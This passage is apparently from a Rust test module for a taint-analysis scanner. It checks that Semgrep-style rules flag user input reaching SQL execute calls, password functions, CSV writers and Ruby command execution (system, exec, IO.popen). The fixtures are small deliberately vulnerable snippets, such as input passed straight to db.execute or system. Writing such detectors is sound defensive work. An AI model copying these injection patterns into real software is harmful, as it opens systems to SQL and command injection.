languages: [javascript]
severity: ERROR
message: "Tainted value reaches a SQL query method"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $QUERY
      - pattern-either:
          - pattern-inside: $POOL.query($QUERY, ...)
          - pattern-inside: $POOL.execute($QUERY, ...)
"#,
        );

        let src = r#"
function run(req, pool) {
  const q = req.body;
  pool.format(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a tainted value reaching an unlisted method (.format) must not fire, got {:?}",
            findings
        );
    }

    /// A bounded-recognition guard: a `pattern-sinks` block whose call context
    /// has a free metavariable callee with NO pinning `metavariable-regex`
    /// (`$F($SINK, ...)`) must NOT compile to a sink (we never invent a callee
    /// name), so the rule is rejected rather than producing an any-call sink.
    #[test]
    fn unpinned_metavar_callee_sink_is_not_compiled() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: js-unpinned-callee
mode: taint
languages: [javascript]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $SINK
      - pattern: $F($SINK, ...)
"#,
        )
        .unwrap();
        // No concrete callee/method can be derived, so the sink role empties and
        // the whole rule is skipped — never an over-broad any-call sink.
        assert!(
            matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)),
            "an unpinned metavariable callee must not compile to a sink"
        );
    }

    // ── Regex-bounded bare-metavariable callee SINK shape ───────────────────

    /// `$FUNCTION(...)` + `metavariable-regex` on `$FUNCTION` → `CallRegex`.
    /// A call whose callee matches the regex with a tainted argument FIRES;
    /// a call whose callee does NOT match the regex does NOT fire (proving the
    /// regex is enforced at match time, not dropped). Mirrors
    /// `md5-used-as-password` (`regex: (?i)(.*password.*)`).
    #[test]
    fn callregex_sink_fires_on_matching_callee_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-password-sink
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a *password* function"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $FUNCTION(...)
      - metavariable-regex:
          metavariable: $FUNCTION
          regex: (?i)(.*password.*)
"#,
        );

        // Callee `hash_password` matches `(?i).*password.*` → must fire.
        let fire_src = r#"
def handler():
    data = input()
    hash_password(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted value reaching hash_password() (callee matches the regex) must fire, got {:?}",
            findings
        );

        // Near-miss: callee `log_event` does NOT match the regex → must NOT fire.
        let miss_src = r#"
def handler():
    data = input()
    log_event(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "a tainted value reaching a callee NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// `$WRITER.$WRITE(...)` + `metavariable-regex` on `$WRITE` →
    /// `MethodNameRegex`. A method call whose method name matches the regex
    /// fires; a method whose name does NOT match does not. Mirrors
    /// `csv-writer-injection` (`regex: ^(writerow|writerows|writeheader)$`).
    #[test]
    fn methodnameregex_sink_fires_on_matching_method_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-csv-writer
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a csv writer row method"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $WRITER.$WRITE(...)
      - metavariable-regex:
          metavariable: $WRITE
          regex: ^(writerow|writerows|writeheader)$
"#,
        );

        // Method `writerow` matches the alternation → must fire.
        let fire_src = r#"
def handler(w):
    data = input()
    w.writerow(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into w.writerow() (method matches regex) must fire, got {:?}",
            findings
        );

        // Near-miss: method `flush` does NOT match the regex → must NOT fire.
        let miss_src = r#"
def handler(w):
    data = input()
    w.flush(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into a method NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// `$EXEC(...)` + an alternation `metavariable-regex` with DOTTED names
    /// (`IO.popen`) → `CallRegex` tested against the full callee text. The
    /// bare `system(...)` callee fires; `puts(...)` (not listed) does not.
    /// Mirrors `dangerous-exec` (Ruby).
    #[test]
    fn callregex_sink_matches_dotted_alternative_callee_and_not_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-dangerous-exec-min
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted input reaches a command-execution function"
pattern-sources:
  - pattern: gets
pattern-sinks:
  - patterns:
      - pattern: $EXEC(...)
      - metavariable-regex:
          metavariable: $EXEC
          regex: ^(system|exec|IO.popen)$
"#,
        );

        // `system(cmd)` callee matches the alternation → must fire.
        let fire_src = r#"
def handler
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(fire_src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into system() (callee matches regex) must fire, got {:?}",
            findings
        );

        // Near-miss: `puts(cmd)` is not in the alternation → must NOT fire.
        let miss_src = r#"
def handler
  cmd = gets
  puts(cmd)
end
"#;
        let tree = parse_file(miss_src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into puts() (callee NOT matching the regex) must not fire, got {:?}",
            findings
        );
    }

    /// FP-safety guard: a bare-metavariable callee sink with NO pinning
    /// `metavariable-regex` must still compile to NOTHING (the sink role empties
    /// and the rule is skipped), so the regex-constrained path never relaxes the
    /// universal-callee refusal.
    #[test]
    fn bare_metavar_callee_sink_without_pin_still_compiles_to_nothing() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: py-unpinned-callee-sink
mode: taint
languages: [python]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $FUNCTION(...)
"#,
        )
        .unwrap();
        assert!(
            matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)),
            "a bare-metavar callee sink with no metavariable-regex pin must not compile"
        );
    }

    // ── Regex-bounded metavariable-RECEIVER SINK shape ──────────────────────

    /// `$OBJ.method(...)` + an anchored-alternation `metavariable-regex` on the
    /// RECEIVER `$OBJ` → enumerated concrete `Call { "<recv>.method" }` sinks.
    /// A tainted value reaching `db.execute(...)` (receiver in the alternation)
    /// FIRES; the same method on a receiver NOT in the alternation
    /// (`session.execute(...)`) does NOT fire — proving the receiver regex is
    /// enforced at match time instead of being dropped to a receiver-agnostic
    /// `MethodName`.
    #[test]
    fn receiver_regex_sink_fires_on_matching_receiver_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-db-execute
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a db/conn execute()"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $CONN.execute(...)
      - metavariable-regex:
          metavariable: $CONN
          regex: ^(db|conn)$
"#,
        );

        // Receiver `db` is in the alternation → must fire.
        let fire_src = r#"
def handler():
    data = input()
    db.execute(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into db.execute() (receiver matches the regex) must fire, got {:?}",
            findings
        );

        // Near-miss: receiver `session` is NOT in the alternation → must NOT fire.
        let miss_src = r#"
def handler():
    data = input()
    session.execute(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into a receiver NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// Control: the SAME `$OBJ.method(...)` sink WITHOUT the receiver
    /// `metavariable-regex` compiles to a receiver-agnostic `MethodName` and
    /// therefore OVER-FIRES on the near-miss receiver — demonstrating the
    /// broadening that the receiver-regex pin removes.
    #[test]
    fn receiver_method_sink_without_pin_overfires_on_any_receiver() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-any-execute
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches any .execute()"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - pattern: $CONN.execute(...)
"#,
        );

        // Without the receiver pin, ANY `*.execute(...)` receiver fires — this is
        // the over-fire the pinned rule above suppresses.
        let miss_src = r#"
def handler():
    data = input()
    session.execute(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "an unpinned `$OBJ.execute(...)` sink fires on any receiver (the broadening), got {:?}",
            findings
        );
    }

    /// A metavariable-receiver concrete-method sink whose receiver pin is a
    /// GENERAL (non-alternation) regex is NOT enumerable to exact callees, so
    /// the receiver-regex recognizer declines and the entry falls through to
    /// the broad `MethodName` extraction — i.e. it still compiles (no panic, no
    /// FP-unsafe relaxation), proving the recognizer is bounded to anchored
    /// alternations of plain identifiers.
    #[test]
    fn receiver_regex_general_regex_falls_through_to_method_name() {
        let g = compiled(
            r#"
id: py-general-receiver
mode: taint
languages: [python]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $CONN.execute(...)
      - metavariable-regex:
          metavariable: $CONN
          regex: ^db.*$
"#,
        )
        .spec;
        // A general receiver regex cannot enumerate exact callees, so the sink
        // degrades to the receiver-agnostic `MethodName { execute }` rather than
        // an enumerated `Call`.
        assert_eq!(g.sinks.len(), 1, "expected a single fallback sink matcher");
        assert!(
            matches!(&g.sinks[0], GenericMatcher::MethodName { method, .. } if method == "execute"),
            "a general receiver regex must fall through to MethodName, got {:?}",
            g.sinks[0]
        );
    }
}
